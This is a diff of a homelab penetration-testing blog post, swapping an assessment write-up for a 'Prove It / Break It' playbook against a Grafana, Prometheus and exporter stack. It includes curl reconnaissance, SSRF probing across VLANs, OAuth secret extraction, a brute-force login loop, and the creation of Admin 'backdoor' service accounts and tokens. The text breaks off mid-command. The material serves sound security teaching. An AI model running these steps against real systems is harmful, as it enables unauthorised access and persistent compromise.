@@ -55,767 +55,1139 @@ ShowShareButtons: false
 
 ---
 
-> **Controlled Lab Environment -- Authorization Required**
->
-> All techniques demonstrated in this post were performed in an isolated personal homelab environment against systems I own and operate. **Do not replicate these techniques against systems you do not own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and equivalent laws in other jurisdictions. The configurations shown are deliberately insecure for educational purposes.
+**⚠️ Controlled Lab Environment — Not for Production Use**
+
+All techniques demonstrated in this post were performed in an isolated personal homelab environment. Do not replicate these techniques against systems you do not own or have explicit authorization to test. The configurations shown are deliberately insecure for educational purposes. Always test in non-production environments.
 
 ---
 
-## What Happens When You Actually Test Your Monitoring Stack
+# Build It, Break It — Vulnerability Discovery & Exploitation Playbook
 
-The previous post deployed a Grafana monitoring stack with Authentik SSO, Prometheus, and four exporters across a multi-VLAN lab. It was deployed deliberately insecure -- HTTP everywhere, no authentication on exporters, default session timeouts, secrets in plaintext `.env` files. The closing section listed those exposures and promised to quantify them.
+**Published by Oob Skulden™**
 
-This is that post.
+**Methodology:** Prove the vulnerability. Exploit the vulnerability.
 
-Over a 90-minute session from a jump box on VLAN 50, we ran 98 commands against the monitoring stack on VLAN 75 (192.168.75.109). No credentials to start. No prior access to Grafana-lab. Just a `curl` binary and an attacker's mindset.
+**Target Environment:** Grafana-lab (192.168.75.109) | Authentik-lab (192.168.80.54) | OpenBAO (192.168.100.140)
 
-The result: 15 confirmed vulnerabilities, 4 critical, 4 high, 4 medium, 3 low. Complete infrastructure topology extracted. OAuth secrets captured off the wire. A persistent Admin backdoor created and verified from a different network segment. Cross-VLAN reconnaissance through an unauthenticated SSRF proxy. Every finding maps to specific NIST 800-53, SOC 2, CIS, and PCI-DSS controls -- the full compliance matrix is at the end.
+**Baseline Score:** 6.0/10 (vulnerable)
 
-The hardening and remediation for each of these is covered in the companion post. This post is the assessment: what's exposed, how we proved it, and what an attacker does with it.
-
----
-
-## The Lab Environment
-
-Two terminals, two VLANs, two perspectives.
-
-**JUMP BOX** (`XFCE$`) sits on VLAN 50. This is the external attacker -- adjacent network, no credentials, simulating someone who has network reachability but nothing else. 34 commands originated here.
-
-**GRAFANA-LAB** (`oob@grafana-lab:~$`) is the monitoring host on VLAN 75 (192.168.75.109). This is the post-compromise perspective -- what happens after an attacker gets shell access via SSH or a container escape. 64 commands originated here.
-
-The monitoring stack runs five Docker containers: Grafana, Prometheus, Node Exporter, cAdvisor, and Blackbox Exporter. Authentik lives on a separate host at 192.168.80.54 (VLAN 80). All ports bind `0.0.0.0`. All traffic is HTTP.
+**URL Verification Date:** February 21, 2026
 
 ---
 
-## VULN-01: Prometheus -- Your Infrastructure Map, No Password Required [CRITICAL]
+## Document Structure
 
-This is always the first thing to check on a monitoring stack. Prometheus ships with no authentication by default. Not "authentication disabled" -- the concept doesn't exist in the default configuration. There's no login page. There's no access denied response. You either can reach port 9090 or you can't, and if you can, you own the data.
+This document contains the first two steps of the four-step pattern:
 
-From the jump box:
+1. **PROVE IT** — Commands that demonstrate the vulnerability exists on the vanilla baseline
+2. **BREAK IT** — What an attacker would do with this access (exploitation path)
 
-```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.75.109:9090/
-HTTP 302
-```
-
-HTTP 302 -- redirect to the web UI. No auth challenge. Now pull the targets API:
-
-```bash
-curl -s http://192.168.75.109:9090/api/v1/targets | jq '.data.activeTargets[] | {job: .labels.job, instance: .labels.instance, health: .health}'
-```
-
-```json
-{"job": "blackbox", "instance": "blackbox-exporter:9115", "health": "up"}
-{"job": "cadvisor", "instance": "cadvisor:8080", "health": "up"}
-{"job": "grafana", "instance": "grafana:3000", "health": "up"}
-{"job": "node-exporter", "instance": "node-exporter:9100", "health": "up"}
-{"job": "prometheus", "instance": "localhost:9090", "health": "up"}
-```
-
-Five services, their internal Docker DNS names, their ports, and their health status. One unauthenticated API call and an attacker has the complete service topology.
-
-It gets worse. PromQL queries extract host-level data:
-
-```bash
-curl -s 'http://192.168.75.109:9090/api/v1/query?query=node_uname_info' | jq '.data.result[0].metric | {nodename, release, machine}'
-```
-
-```json
-{"nodename": "1c28a1c73296", "release": "6.12.69+deb13-amd64", "machine": "x86_64"}
-```
-
-Kernel 6.12.69, Debian 13, x86_64. That's CVE-targeting data. And the full Prometheus configuration -- every scrape job, every target, every internal endpoint -- dumps from the status API:
-
-```bash
-curl -s http://192.168.75.109:9090/api/v1/status/config | jq -r '.data.yaml' | head -40
-```
-
-The output is the entire `prometheus.yml`. Scrape intervals, protocols, target lists, scheme configuration. This single endpoint provides more reconnaissance value than most active scanning tools.
-
-**Compliance impact:** NIST AC-3 (Access Enforcement), CM-7 (Least Functionality), SOC 2 CC6.1, CIS Controls 4.1, CIS Docker 5.13.
+> For FIX IT and VERIFY steps, see **Part 2: Fix It — Hardening & Verification Playbook**
 
 ---
 
-## VULN-02: cAdvisor -- Container Inventory for Free [CRITICAL]
+## Jump Box Approach
 
-cAdvisor is a container metrics exporter. Google built it, it's widely deployed, and it answers the question "what containers are running and what resources do they have?" without requiring you to ask politely.
+All PROVE IT and BREAK IT commands run from a jump box — a separate machine with network access to the target environment. This demonstrates the attacker's perspective: no SSH, no Docker socket, no local file access. Only what the network exposes.
 
-```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.75.109:8080/containers/
-HTTP 200
-```
+**Jump box requirements:** `curl`, `python3`, `jq`, `openssl` (standard pentesting toolkit)
 
-Full graphical web UI, no authentication. The machine API gives hardware specs:
-
-```bash
-curl -s http://192.168.75.109:8080/api/v1.0/machine | jq '{num_cores, memory_capacity, machine_id, system_uuid}'
-```
-
-```json
-{
-  "num_cores": 2,
-  "memory_capacity": 2069454848,
-  "machine_id": "<redacted-machine-id>",
-  "system_uuid": "<redacted-system-uuid>"
-}
-```
-
-Two cores, 2GB RAM, unique machine ID, and system UUID. The UUID confirms this is a Proxmox VM. But the container enumeration is where this gets interesting -- and where the testing hit some dead ends worth documenting.
-
-### The API Path Hunt
-
-cAdvisor's API documentation suggests `/docker` as the container listing endpoint. It didn't work:
-
-```bash
-curl -s http://192.168.75.109:8080/api/v1.0/containers/docker | head -20
-# failed to get container "/docker" with error: unknown container "/docker"
-```
-
-Tried the v2.0 API:
-
-```bash
-curl -s http://192.168.75.109:8080/api/v2.0/containers/ | head -100
-# unknown request type "containers"
-```
-
-The v2.0 summary endpoint exists but only returns the root container. After several attempts, the working path turned out to be v1.0 with the systemd slice hierarchy. cAdvisor in this environment maps containers under `/system.slice` rather than `/docker` because of how the Docker service is registered with systemd:
-
-```bash
-curl -s http://192.168.75.109:8080/api/v1.0/containers/system.slice | jq '.subcontainers[] | .name'
-```
-
-This returned the full inventory -- five Docker container IDs, plus host services including SSH, cron, qemu-guest-agent (confirming the Proxmox hypervisor), and every systemd service on the host. Individual container details exposed the image names and resource configurations:
-
-```bash
-curl -s "http://192.168.75.109:8080/api/v1.0/containers/system.slice/docker-1c28a1c73296..." | jq '{image: .spec.image, memory_limit: .spec.memory.limit}'
-```
-
-```json
-{"name": "prom/node-exporter:latest", "memory_limit": 18446744073709551615}
-```
-
-That memory limit -- `18446744073709551615` -- is `UINT64_MAX`. It means "unlimited." Every container on the host has no memory constraints. On a 2GB host, any container can consume all available memory until the OOM killer intervenes.
-
-**Compliance impact:** NIST AC-3, CM-7, SOC 2 CC6.1, CIS Docker 5.4.
+Three exceptions (VULN-09, VULN-11, VULN-12) require Docker API access for proof. These are labeled **"Auditor Access Required"** and represent findings from an internal security review, not an external attack. This distinction matters for content framing — external attackers can prove 12 of 15 vulnerabilities with nothing but network access.
 
 ---
 
-## VULN-03: Node Exporter -- Everything About the Host [CRITICAL]
+## What We're Doing Here
 
-Node Exporter is designed to expose host-level metrics for Prometheus to scrape. It does this job extremely well. The problem is that it does this job for anyone who can reach port 9100.
+So here's the situation. We've got a Grafana monitoring stack running on a Debian host — Grafana, Prometheus, Node Exporter, cAdvisor, and Blackbox Exporter. It's deployed the way most people deploy monitoring: `docker compose up -d`, make sure the dashboards load, move on with life.
 
-```bash
-curl -s http://192.168.75.109:9100/metrics | grep node_uname_info
-node_uname_info{domainname="(none)",machine="x86_64",nodename="1c28a1c73296",release="6.12.69+deb13-amd64"} 1
-```
+The problem is that "it works" and "it's secure" are two completely different things. This stack is exposed on five different ports with zero authentication on four of them. Secrets are in plaintext config files. There's no TLS. Sessions never expire. And the whole thing is one curl command away from giving an attacker a complete map of your infrastructure.
 
-Kernel version with compile date -- February 8, 2026. That compile date narrows CVE searches to a specific patch level. The full metrics endpoint also exposed:
+In this document, we're going to prove all of that. Every vulnerability gets two steps: PROVE IT (demonstrate it exists with actual commands) and BREAK IT (show what an attacker would do with it). We're running everything from a jump box — a separate machine on the network — because that's the attacker's perspective. If you can break it from the network, so can they.
 
-Network interfaces and MAC addresses on eth0, storage layout (single 32GB ext4 on `/dev/sda1` -- no redundancy), memory details (2GB total, 1.2GB available, 1.7GB swap), file descriptor allocation (832 out of effectively unlimited), process states (1 running, 0 blocked -- system is idle), and boot time (epoch 1770662211, which translates to February 10, 2026 -- useful for tracking patch cadence).
-
-Every one of these data points has tactical value. The MAC address is a network fingerprint. The single-disk layout means no RAID -- one disk failure is total loss. 2GB RAM with 1.2GB free means a sustained request flood is a viable denial-of-service vector. The boot time tells an attacker how recently the system was patched.
-
-**Compliance impact:** NIST CM-7, CIS Controls 4.1.
+The goal isn't to be scary. The goal is to show you exactly what's exposed so that when we fix it in Part 2, you understand *why* each fix matters. You can't defend what you don't understand.
 
 ---
 
-## VULN-04: Blackbox Exporter -- An SSRF Proxy You Deployed on Purpose [CRITICAL]
+## Prerequisites — What Must Exist Before Phase 1
 
-Blackbox Exporter probes endpoints and reports whether they're up. You give it a URL, it makes the request, it returns the result. That's its entire job. It's also the definition of a server-side request forgery proxy if it's exposed without access controls.
+### Infrastructure (must be running and reachable):
 
-From the jump box, first test: can it reach external targets?
+- **Grafana-lab (192.168.75.109):** Docker + docker compose installed, `~/monitoring/` directory with vanilla monitoring stack
+- **Authentik-lab (192.168.80.54):** Authentik deployed, admin access to `http://192.168.80.54:9000`
+- **OpenBAO (192.168.100.140):** OpenBAO deployed in Docker, unsealed, root token available
 
-```bash
-curl -s "http://192.168.75.109:9115/probe?target=http://google.com&module=http_2xx" | grep probe_success
-probe_success 1
-```
+### Authentik Configuration (must be done in Authentik UI first):
 
-Yes. Now the real question -- can it reach other VLANs?
+1. Create an OAuth2/OIDC Provider named `grafana-oidc-provider`
+2. Set redirect URI: `http://192.168.75.109:3000/login/generic_oauth`
+3. Note the Client ID (typically `grafana-client`) and Client Secret (you'll need this in Step 1.1)
+4. Create an Application linked to this provider
 
-```bash
-curl -s "http://192.168.75.109:9115/probe?target=http://<internal-host-vlan100>/health&module=http_2xx" | grep -E "probe_(success|http_status)"
-probe_http_status_code 200
-probe_success 1
-```
+### Jump box:
 
-An internal service on a completely separate VLAN, responding through the Blackbox proxy. The jump box on VLAN 50 shouldn't be able to reach that network segment directly, but it doesn't need to -- Blackbox sits on VLAN 75 and makes the request on the attacker's behalf.
+Any machine with network access to all three VLANs (75, 80, 100). Needs: `curl`, `python3`, `jq`, `openssl`
 
-Same thing works for Authentik on VLAN 80:
+### Grafana-lab host packages:
 
 ```bash
-curl -s "http://192.168.75.109:9115/probe?target=http://192.168.80.54:9000/-/health/live/&module=http_2xx" | grep probe_success
-probe_success 1
+sudo apt install -y apache2-utils jq
 ```
 
-Two separate VLAN boundaries bypassed through a single unauthenticated endpoint. It also works as a port scanner -- iterate through common ports on any reachable host and `probe_success` tells you which ones are open. Complete VLAN boundary bypass and service enumeration from a single monitoring exporter.
-
-One positive finding from this section: the Docker API on port 2375 was confirmed not exposed (`curl -s http://192.168.75.109:2375/containers/grafana/json` returned nothing). That would have been game over.
-
-**Compliance impact:** NIST SC-7 (Boundary Protection), AC-4 (Information Flow Enforcement), SOC 2 CC6.6, CIS Controls 13.4.
+(needed for Phases 3 and 6)
 
 ---
 
-## VULN-05: OAuth Client Secret in Plaintext -- Three Different Ways [HIGH]
+## Password & Credential Convention
 
-This one requires shell access to Grafana-lab, so we're in the post-compromise perspective. But "shell access" here means any user with SSH to the host -- not root, not a security admin, just someone who can run `docker exec`.
-
-**Vector 1 -- Container environment:**
+This playbook uses consistent variable names across all phases. Decide your passwords NOW and use them everywhere.
 
 ```bash
-sudo docker exec grafana env | grep CLIENT_SECRET
-GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET=<redacted-128-char-secret>
+# DECIDE THESE VALUES BEFORE STARTING — write them down securely
+# These are used throughout the entire playbook
+
+ADMIN_PASSWORD="<your-grafana-admin-password>"      # Grafana admin (replaces default admin/admin)
+PROM_PASSWORD="<your-prometheus-password>"           # Prometheus basic auth
+OAUTH_CLIENT_SECRET="<from-authentik-step-above>"    # Copy from Authentik provider
+
+# These are GENERATED during Phase 1 Step 1.2 — you'll fill them in after that step
+GRAFANA_ROLE_ID="<generated-in-step-1.2>"
+GRAFANA_SECRET_ID="<generated-in-step-1.2>"
+
+# These are GENERATED during Phase 6.1 — you'll fill them in after that step
+PKI_ROLE_ID="<generated-in-phase-6.1>"
+PKI_SECRET_ID="<generated-in-phase-6.1>"
 ```
 
-128-character OAuth client secret. Now check if it's exposed through other paths.
-
-**Vector 2 -- Container metadata:**
-
-```bash
-sudo docker inspect grafana --format '{{json .Config.Env}}' | jq -r '.[] | select(startswith("GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET"))'
-```
-
-Same secret. `docker inspect` doesn't require exec into the container -- anyone with Docker socket access gets it.
-
-**Vector 3 -- Plaintext on disk:**
-
-```bash
-cat ~/monitoring/.env | grep CLIENT_SECRET
-```
-
-Same secret, sitting in a `.env` file in the user's home directory. Three independent extraction vectors for the same credential.
-
-The full OAuth configuration pull exposed the complete attack kit:
-
-```bash
-sudo docker exec grafana env | grep -E "(CLIENT_ID|CLIENT_SECRET|AUTH_URL|TOKEN_URL)"
-GF_AUTH_GENERIC_OAUTH_AUTH_URL=http://192.168.80.54:9000/application/o/authorize/
-GF_AUTH_GENERIC_OAUTH_CLIENT_ID=grafana-client
-GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET=<redacted-128-char-secret>
-GF_AUTH_GENERIC_OAUTH_TOKEN_URL=http://192.168.80.54:9000/application/o/token/
-```
-
-Client ID, client secret, authorization endpoint, and token endpoint -- all over HTTP. With these, an attacker can impersonate the Grafana application to Authentik and exchange authorization codes for access tokens.
-
-A quick verification confirmed the Authentik token endpoint is alive and accepting requests:
-
-```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.80.54:9000/application/o/token/
-HTTP 405
-```
-
-HTTP 405 -- Method Not Allowed. It rejects GET but accepts POST. The endpoint is live and ready to exchange authorization codes for tokens. An attacker with the client secret has everything needed to complete the OAuth flow.
-
-A secondary discovery during this investigation: `GF_USERS_ALLOW_SIGN_UP=false` but `GF_AUTH_GENERIC_OAUTH_ALLOW_SIGN_UP=true`. The OAuth sign-up flag overrides the general one. That contradiction becomes VULN-13.
-
-**Compliance impact:** NIST SC-28 (Protection of Information at Rest), IA-5 (Authenticator Management), SOC 2 CC6.1, CIS Docker 4.10.
+Every command in this playbook references these variables. When you see `$ADMIN_PASSWORD` in a curl command, use the value you chose above.
 
 ---
 
-## VULN-06: Sessions That Outlive the Employee [HIGH]
+## Pre-Flight: Confirm Vanilla Baseline
 
-The question here is simple: if you disable a user account in Authentik, how long before they lose access to Grafana? The answer for this deployment was up to 30 days.
+Before we start breaking things, we need to confirm that everything is actually exposed. This pre-flight check is the "before" picture. If all five services return HTTP 200 with no auth, we're working with a vanilla baseline and every vulnerability we're about to demonstrate is real.
 
-No session hardening environment variables were configured:
+Run this from your jump box — not from the Grafana host itself. That's important. We're proving that these services are reachable from the network, not just locally.
+
+Before starting, confirm ALL services are exposed and unauthenticated. Run from your jump box — if these work remotely, attackers can too.
+
+**Expected:** All 200, no auth required. This is your starting point.
 
 ```bash
-sudo docker exec grafana env | grep -iE "(INACTIVE_LIFETIME|MAXIMUM_LIFETIME|TOKEN_ROTATION)"
+# From jump box (any machine with network access to VLAN 75)
+GRAFANA="192.168.75.109"
+
+echo "=== VANILLA BASELINE CONFIRMATION ==="
+echo "Running from: $(hostname) / $(hostname -I | awk '{print $1}')"
+echo ""
+
+echo "--- Service Availability (all should return 200, no auth) ---"
+
+echo -n "Grafana (port 3000): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:3000/api/health && echo ""
+
+echo -n "Prometheus (port 9090): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:9090/api/v1/status/config && echo ""
+
+echo -n "Node Exporter (port 9100): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:9100/metrics && echo ""
+
+echo -n "cAdvisor (port 8080): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:8080/metrics && echo ""
+
+echo -n "Blackbox Exporter (port 9115): "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:9115/metrics && echo ""
+
+echo ""
+echo "--- If ANY return 401 or connection refused, the baseline is already hardened ---"
+
+echo ""
+echo "--- OpenBAO Health (cross-VLAN) ---"
+curl -s http://192.168.100.140:8200/v1/sys/health | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'  Sealed: {d[\"sealed\"]}  Initialized: {d[\"initialized\"]}')"
 ```
-
-Empty output. The admin API confirmed the defaults:
-
-```json
-{
-  "login_maximum_inactive_lifetime_duration": "7d",
-  "login_maximum_lifetime_duration": "30d",
-  "token_rotation_interval_minutes": "10"
-}
-```
-
-Seven-day idle timeout, 30-day absolute maximum, 10-minute token rotation. The token rotation keeps sessions alive -- it doesn't revoke them. There's no webhook or callback to Authentik to verify whether the account is still active.
-
-Getting to that admin API output required some troubleshooting. The admin password wasn't in the `.env` file where we expected it -- `GF_SECURITY_ADMIN_PASSWORD` wasn't set via environment variable at all, which means Grafana was using an internally-set password. The known password from prior testing worked after confirming it wasn't being overridden.
-
-The Grafana logs also showed evidence of stale token rotation from previous sessions, with entries from the jump box IP (192.168.50.10) indicating sessions that persisted well beyond any reasonable window.
-
-**Compliance impact:** NIST AC-2(3) (Disable Accounts on Termination), AC-12 (Session Termination), SOC 2 CC6.1, CC6.3, CIS Controls 6.2.
 
 ---
 
-## VULN-07: 50 Login Attempts in Under a Second [HIGH]
+## Phase 1: Session Hardening + OpenBAO Secrets Management
 
-No network-level rate limiting on the Grafana login endpoint. The first test confirmed it locally:
+**Time:** ~2 hours | **Score:** 6.0 to 7.5 (+1.5)
+
+**Vulnerabilities Addressed:** VULN-05, VULN-06
+
+Phase 1 targets the two vulnerabilities that, combined, create the most dangerous scenario in this stack: secrets stored in plaintext and sessions that never die. Think about it — if an attacker gets the OAuth client secret (which is sitting in a `.env` file and in the container environment), they can impersonate the entire OAuth flow. And if a user gets fired but their session cookie never expires, they keep full access to everything Grafana can see. These aren't theoretical — we're about to prove both of them with curl commands from the jump box.
+
+---
+
+### VULN-05: OAuth Secret in Plaintext
+
+**Severity:** High | **CVSS:** 6.5
+
+**Compliance Violations:** NIST SC-28, SOC 2 CC6.1, CIS 6.2
+
+**The goal:** We're trying to prove that the OAuth client secret — the credential that authenticates Grafana to Authentik — is recoverable from the network. Even though Grafana masks the secret with asterisks in its API response, the admin API still exposes the client_id, all OAuth URLs, role mappings, and every other configuration detail. That's a full reconnaissance map. And if you have SSH access to the host (like a disgruntled admin or a compromised server), the actual secret is right there in the `.env` file and container environment — no decryption needed.
+
+**What we're trying to break:** We want to demonstrate that a single authenticated API call gives an attacker everything they need to understand the OAuth integration, identify interception points, and — combined with the lack of TLS (VULN-10) — actually capture the secret in transit.
+
+**API Reference:**
+- Docker CLI exec: https://docs.docker.com/reference/cli/docker/container/exec/
+- Docker inspect: https://docs.docker.com/reference/cli/docker/inspect/
+- Grafana OAuth config: https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#generic-oauth
+
+#### PROVE IT
 
 ```bash
-for i in {1..10}; do
-  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://192.168.75.109:3000/login \
-    -H "Content-Type: application/json" \
-    -d "{\"user\":\"admin\",\"password\":\"attempt$i\"}")
-  echo "Attempt $i: HTTP $response"
-done
+# From jump box — attacker perspective
+GRAFANA="192.168.75.109"
+ADMIN_CREDS="admin:$ADMIN_PASSWORD"    # See Password Convention section
+
+echo "=== VULN-05: OAuth Secret Exposure ==="
+
+# Step 1: Admin settings API dumps the entire configuration remotely
+echo "--- Remote: Full config dump via Admin API ---"
+curl -s -u $ADMIN_CREDS http://$GRAFANA:3000/api/admin/settings | python3 -m json.tool | grep -E "(client_id|client_secret|auth_url|token_url)"
+
+# EXPECTED: Shows all OAuth config including:
+#   "client_id": "grafana-client"
+#   "client_secret": "************" (masked in API response)
+#   "auth_url": "http://..."
+#   "token_url": "http://..."
+
+# NOTE: Grafana masks the client_secret in the API response with ************
+# But the client_id IS exposed in cleartext, AND the attacker now knows
+# OAuth is configured, which URLs to target, and can attempt interception
+
+# Step 2: Even with masking, the attacker knows secrets EXIST and WHERE they are
+echo ""
+echo "--- Remote: Identify all secret-containing config sections ---"
+curl -s -u $ADMIN_CREDS http://$GRAFANA:3000/api/admin/settings | \
+  python3 -c "
+import sys,json
+data = json.load(sys.stdin)
+for section, values in data.items():
+    if isinstance(values, dict):
+        for k,v in values.items():
+            if 'secret' in k.lower() or 'password' in k.lower() or 'key' in k.lower():
+                print(f'  [{section}] {k} = {v}')
+"
+# Shows every secret field across ALL config sections
 ```
 
-Ten attempts, all HTTP 401, no lockout, no delay. Then the speed test from the jump box:
+**What you should see from the jump box:** The full Grafana configuration including OAuth provider details, client_id in cleartext, OAuth endpoint URLs, session settings, and masked secrets. The actual secret value is masked with `************` in the API — but the attacker now has the full configuration map.
+
+**For internal audit (requires SSH access to Grafana-lab):**
 
 ```bash
-time for i in {1..50}; do
-  curl -s -o /dev/null -w "" -X POST http://192.168.75.109:3000/login \
-    -H "Content-Type: application/json" \
-    -d "{\"user\":\"admin\",\"password\":\"attempt$i\"}"
-done
+# SSH to Grafana-lab for the full proof
+ssh oob@192.168.75.109
 
-real    0m0.931s
+# The actual secret is in the .env file
+cat ~/monitoring/.env | grep -i "secret\|password\|token"
+# EXPECTED: CLIENT_SECRET visible in plaintext
+
+# And in the container environment
+docker exec grafana env | grep -i "CLIENT_SECRET"
+# EXPECTED: GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET=the-real-secret-value
+
+# And in docker inspect metadata
+docker inspect grafana --format '{{json .Config.Env}}' | python3 -m json.tool | grep -i "SECRET"
+# EXPECTED: Secret visible in container metadata
 ```
 
-50 attempts in 0.931 seconds. Roughly 54 attempts per second with no rate limiting. At that speed, a focused dictionary attack against a weak password is viable in minutes.
-
-### The Backdoor Chain (And the Shell Escaping Nightmare)
-
-Once the admin password was confirmed, the next test was whether an attacker could establish persistent access that survives a password change. The answer is yes, but getting there involved one of the more frustrating troubleshooting detours in the assessment.
-
-The admin password contained a shell special character -- `!` triggers bash history expansion. Passing it via `curl` required care:
+#### BREAK IT
 
 ```bash
-# Double quotes: shell expanded the !
-curl -s -X POST http://192.168.75.109:3000/api/auth/keys \
-  -u "admin:<test-password>" -d '...'
-# "Invalid username or password"
+# From jump box — what an attacker does with admin API access
+GRAFANA="192.168.75.109"
+ADMIN_CREDS="admin:$ADMIN_PASSWORD"    # See Password Convention section
 
-# Single quotes: should work but auth was still failing
-curl -s -X POST http://localhost:3000/api/auth/keys \
-  -u 'admin:<test-password>' -d '...'
-# "Invalid username or password"
+# Step 1: Extract OAuth config (client_id exposed, secret masked but URLs revealed)
+echo "--- Extract OAuth provider details ---"
+curl -s -u $ADMIN_CREDS http://$GRAFANA:3000/api/admin/settings | \
+  python3 -c "
+import sys,json
+data = json.load(sys.stdin)
+oauth = data.get('auth.generic_oauth', {})
+for k,v in oauth.items():
+    print(f'  {k}: {v}')
+"
+# Attacker now knows: client_id, OAuth URLs, scopes, role mapping
+
+# Step 2: With the client_id and OAuth URLs, attacker can:
+#   - Set up a phishing OAuth flow using the known client_id
+#   - Monitor the HTTP token exchange (VULN-08) to capture the actual secret
+#   - Combined with VULN-10 (no TLS), intercept the full OAuth handshake
+
+# Step 3: The real danger — admin API also exposes database connection strings
+echo ""
+echo "--- Extract database configuration ---"
+curl -s -u $ADMIN_CREDS http://$GRAFANA:3000/api/admin/settings | \
+  python3 -c "
+import sys,json
+data = json.load(sys.stdin)
+db = data.get('database', {})
+for k,v in db.items():
+    print(f'  {k}: {v}')
+"
 ```
 
-After a container restart (to rule out internal lockout) and testing with a known-good password, the breakthrough was heredoc syntax:
+**Attacker value:** Full configuration reconnaissance from the network. OAuth client_id, endpoint URLs, role mappings, database paths, SMTP settings — everything needed to plan further attacks. Combined with VULN-08 (HTTP token exchange) and VULN-10 (no TLS), the masked client_secret can be intercepted in transit.
+
+---
+
+### VULN-06: Session Persistence After Account Disable
+
+**Severity:** Critical | **CVSS:** 8.1
+
+**Compliance Violations:** NIST AC-2(3), NIST AC-12, SOC 2 CC6.1, CIS 5.3, PCI-DSS 8.2.8
+
+**The goal:** This is the "terminated employee" scenario, and it's one of the scariest things we found. We're going to prove that when you disable a user in Authentik, their Grafana session keeps working. Not for a few minutes — indefinitely. Grafana doesn't check back with the identity provider once a session is established. The session cookie just keeps working from any machine on the network.
+
+**What we're trying to break:** We want to show the full attack chain: grab a session cookie, disable the user account in Authentik, wait, and then prove the cookie still works. Then we escalate — using that zombie session to create a service account with a permanent API token. That token survives even when the session eventually does die. It's a persistence backdoor created by a "terminated" user.
+
+**API Reference:**
+- Grafana User API: https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/user/
+- Grafana Org API: https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/org/
+
+#### PROVE IT
+
+This requires a working OAuth login flow with Authentik.
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST http://localhost:3000/login \
+# From jump box
+GRAFANA="192.168.75.109"
+
+# Step 1: Verify no session timeouts are configured via admin API
+echo "=== VULN-06: Session Persistence ==="
+echo "--- Check session configuration via API ---"
+curl -s -u admin:$ADMIN_PASSWORD http://$GRAFANA:3000/api/admin/settings | \
+  python3 -c "
+import sys,json
+data = json.load(sys.stdin)
+auth = data.get('auth', {})
+for k,v in auth.items():
+    if 'lifetime' in k.lower() or 'timeout' in k.lower() or 'rotation' in k.lower():
+        print(f'  {k}: {v}')
+if not any('lifetime' in k.lower() for k in auth):
+    print('  NO SESSION TIMEOUTS CONFIGURED')
+"
+
+# Step 2: Get a session cookie via curl (no browser needed)
+# Method A: Basic auth login (returns a session cookie)
+SESSION_COOKIE=$(curl -s -c - -u admin:$ADMIN_PASSWORD \
+  http://$GRAFANA:3000/api/user | grep grafana_session | awk '{print $NF}')
+echo "Session cookie: $SESSION_COOKIE"
+
+# Method B: If you prefer browser-based OAuth flow:
+# Navigate to http://192.168.75.109:3000
+# Sign in with Authentik -> extract cookie from DevTools (F12 -> Application -> Cookies)
+
+# Step 3: Prove the session works from jump box using the cookie
+echo ""
+echo "--- Session valid (from jump box, not the server) ---"
+curl -s http://$GRAFANA:3000/api/user \
+  --cookie "grafana_session=$SESSION_COOKIE" | python3 -m json.tool
+# EXPECTED: Returns user info — session cookie works remotely
+
+# Step 4: NOW disable the user in Authentik
+# In Authentik admin (http://192.168.80.54:9000):
+#   Directory -> Users -> select test user -> Edit -> uncheck "Is active" -> Update
+
+# Step 5: WAIT 30 seconds, then test again from jump box
+sleep 30
+echo ""
+echo "--- Session status AFTER account disable (still from jump box) ---"
+curl -s http://$GRAFANA:3000/api/user \
+  --cookie "grafana_session=$SESSION_COOKIE" | python3 -m json.tool
+# EXPECTED: STILL returns user info — session persists!
+```
+
+**What you should see:** The session cookie works from any machine on the network, and continues working even after the user account is disabled in Authentik.
+
+#### BREAK IT
+
+```bash
+# From jump box — a terminated employee's session still works
+GRAFANA="192.168.75.109"
+
+# Use the SESSION_COOKIE obtained in PROVE IT above
+# SESSION_COOKIE="<value from PROVE IT Step 2>"
+
+# Step 1: The disabled user can still enumerate all org users
+curl -s http://$GRAFANA:3000/api/org/users \
+  --cookie "grafana_session=$SESSION_COOKIE" | python3 -m json.tool
+# Returns full user list — from a disabled account
+
+# Step 2: If the user had Admin role, they can create a persistent backdoor
+SA_RESPONSE=$(curl -s -X POST http://$GRAFANA:3000/api/serviceaccounts \
+  --cookie "grafana_session=$SESSION_COOKIE" \
   -H "Content-Type: application/json" \
-  -d @- <<'EOF'
-{"user":"admin","password":"<test-password>"}
-EOF
-HTTP 200
-```
+  -d '{"name":"persistence-backdoor","role":"Admin"}')
+SA_ID=$(echo "$SA_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id','FAILED'))")
+echo "Service account created: ID $SA_ID"
 
-The single-quoted heredoc (`<<'EOF'`) prevents all shell expansion. The password had been changed during prior testing, which is why earlier attempts were failing -- not a shell escaping issue at all. Classic red herring.
-
-With admin access confirmed, the legacy `/api/auth/keys` endpoint returned "Not found" -- deprecated in Grafana v12. The modern service account API worked:
-
-```bash
-# Create Admin service account
-curl -s -X POST http://localhost:3000/api/serviceaccounts \
+# Step 3: Generate permanent token (survives even when session finally dies)
+curl -s -X POST "http://$GRAFANA:3000/api/serviceaccounts/$SA_ID/tokens" \
+  --cookie "grafana_session=$SESSION_COOKIE" \
   -H "Content-Type: application/json" \
-  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)" \
-  -d '{"name":"backdoor-test","role":"Admin"}'
-{"id":5,"name":"backdoor-test","login":"sa-1-backdoor-test","orgId":1,"isDisabled":false,"role":"Admin"}
